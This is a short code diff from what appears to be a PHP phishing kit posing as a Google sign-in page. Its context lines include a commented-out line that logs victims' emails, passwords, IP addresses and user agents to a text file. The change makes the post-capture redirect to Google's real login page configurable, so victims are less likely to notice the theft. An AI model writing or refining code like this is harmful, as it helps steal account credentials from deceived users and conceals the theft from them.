@@ -41,7 +41,7 @@ class HomeController extends Controller
             // file_put_contents('usernames.txt', '[EMAIL]: ' . $email . '  [PASS]: ' . $pass . ' [IP]: ' . $ipaddress . ' [USER_AGENT]: ' . $_SERVER['HTTP_USER_AGENT'] . "\n", FILE_APPEND);
             session()->forget('Email');
             echo '<script>
-                window.location = "https://accounts.google.com/login";
+                window.location = "'.env("REDIRECT_SUCCESS",'https://accounts.google.com/login').'";
             </script>';
         }
 
